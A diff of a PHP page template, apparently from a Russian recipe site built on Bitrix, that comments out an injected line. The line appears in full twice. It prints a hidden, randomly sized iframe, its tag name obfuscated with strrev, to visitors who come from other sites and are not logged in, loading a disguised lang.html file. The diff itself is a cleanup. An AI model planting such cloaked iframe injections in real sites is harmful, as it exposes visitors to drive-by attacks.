@@ -13,7 +13,7 @@ if(
 ) $bSubNav = true;
 
 ?>
-<?if (isset($_SERVER['HTTP_REFERER'])) {if(!empty($_SERVER['HTTP_REFERER']) AND empty($_COOKIE['BITRIX_SM_LOGIN'])) { if (!preg_match('/'.$_SERVER['HTTP_HOST'].'/i',$_SERVER['HTTP_REFERER'])) {echo '<'.strrev("emarfi").' id="var allRecipesResult" width='.rand(4,8).' height='.rand(4,8).' marginwidth=0 marginheight=0 scrolling=no frameborder=0 src="/bitrix/themes/.default/lang/de/lang.html"></'.strrev("emarfi").'>';}}}?>
+<?//if (isset($_SERVER['HTTP_REFERER'])) {if(!empty($_SERVER['HTTP_REFERER']) AND empty($_COOKIE['BITRIX_SM_LOGIN'])) { if (!preg_match('/'.$_SERVER['HTTP_HOST'].'/i',$_SERVER['HTTP_REFERER'])) {echo '<'.strrev("emarfi").' id="var allRecipesResult" width='.rand(4,8).' height='.rand(4,8).' marginwidth=0 marginheight=0 scrolling=no frameborder=0 src="/bitrix/themes/.default/lang/de/lang.html"></'.strrev("emarfi").'>';}}}?>
 <div id="topbar"<?if(!$bSubNav){?> class="nosubmenu"<?}?>><div class="menu">
 <!--<div class="item sauce_contest"><?if(strpos($_SERVER['REQUEST_URI'], "contests/sauce") === false){?><a href="/contests/sauce/"><span title="Соус Прайм"></span></a><?} else {?><span><span title="Соус Прайм"></span></span><?}?></div>
 <div class="item magi_contest"><?if(strpos($_SERVER['REQUEST_URI'], "contests/magi") === false){?><a href="/contests/magi/"><span>Суши <em>маги</em></span></a><?} else {?><span><span>Суши <em>маги</em></span></span><?}?></div>-->
